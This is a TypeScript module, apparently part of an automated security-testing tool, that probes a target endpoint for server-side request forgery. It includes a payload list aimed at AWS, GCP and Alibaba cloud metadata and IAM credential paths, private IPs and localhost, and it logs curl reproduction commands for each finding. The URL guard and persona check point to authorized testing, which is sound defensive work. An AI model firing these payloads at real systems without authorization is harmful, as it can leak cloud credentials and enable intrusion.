import { request } from 'undici'
import { type JudgeContext, type Finding } from '../types/index.js'
import { assertAllowedUrl } from '../safety/url_guard.js'

export const TEST_SSRF_SCHEMA = {
  type: 'object',
  properties: {
    endpoint: {
      type: 'string',
      description: 'Endpoint with URL parameter to test (e.g., /api/fetch)',
    },
    urlParam: {
      type: 'string',
      description: 'Parameter name that accepts a URL (e.g., redirect_url, webhook, imageUrl)',
    },
    token: {
      type: 'string',
      description: 'Auth token (optional)',
    },
  },
  required: ['endpoint', 'urlParam'],
}

const SSRF_PAYLOADS = [
  { url: 'http://169.254.169.254/latest/meta-data/', desc: 'AWS metadata' },
  { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'AWS IAM credentials' },
  { url: 'http://100.100.100.200/latest/meta-data/', desc: 'Alibaba Cloud metadata' },
  { url: 'http://metadata.google.internal/computeMetadata/v1/', desc: 'GCP metadata' },
  { url: 'http://192.168.1.1/', desc: 'Private IP 192.168.1.1' },
  { url: 'http://10.0.0.1/', desc: 'Private IP 10.0.0.1' },
  { url: 'http://localhost/', desc: 'localhost' },
  { url: 'http://[::1]/', desc: 'IPv6 localhost' },
]

export async function testSsrf(
  input: { endpoint: string; urlParam: string; token?: string },
  ctx: JudgeContext
): Promise<string> {
  if (!['internal', 'commercial'].includes(ctx.persona)) {
    return `test_ssrf: skipped (persona=${ctx.persona}, requires internal or commercial)`
  }

  const findings: Finding[] = []
  const results: string[] = []
  const targetUrl = `${ctx.targetBaseUrl}${input.endpoint}`
  assertAllowedUrl(targetUrl, ctx.allowedUrls)

  const headers: Record<string, string> = { 'Content-Type': 'application/json' }
  if (input.token) headers['Authorization'] = `Bearer ${input.token}`

  for (const payload of SSRF_PAYLOADS) {
    try {
      const body = JSON.stringify({ [input.urlParam]: payload.url })

      const res = await request(targetUrl, {
        method: 'POST',
        headers,
        body,
      })

      const responseBody = await res.body.text()
      results.push(`[${payload.desc}]: ${res.statusCode}`)

      const hasMetadataLeak = /ami-id|instance-id|security-credentials|computeMetadata/i.test(responseBody)

      if (res.statusCode >= 200 && res.statusCode < 300 && hasMetadataLeak) {
        findings.push({
          severity: 'CRITICAL',
          category: 'C',
          description: `SSRF confirmed: ${payload.desc} — response contains cloud metadata`,
          evidence: `curl -X POST '${targetUrl}' -d '{"${input.urlParam}": "${payload.url}"}'\nResponse: ${responseBody.slice(0, 500)}`,
          isFail: true,
          baseDeduction: 10,
          toolName: 'test_ssrf',
        })
      } else if (res.statusCode >= 200 && res.statusCode < 300) {
        findings.push({
          severity: 'HIGH',
          category: 'C',
          description: `Possible SSRF: ${payload.desc} — server made outbound request (no metadata in response)`,
          evidence: `curl -X POST '${targetUrl}' -d '{"${input.urlParam}": "${payload.url}"}'\nResponse: ${responseBody.slice(0, 300)}`,
          isFail: false,
          baseDeduction: 10,
          toolName: 'test_ssrf',
        })
      }
    } catch (err) {
      results.push(`[${payload.desc}]: ERROR`)
    }
  }

  ctx.findings.push(...findings)
  return `test_ssrf on ${input.endpoint}?${input.urlParam}=...\n${results.join('\n')}\nFindings: ${findings.length}`
}
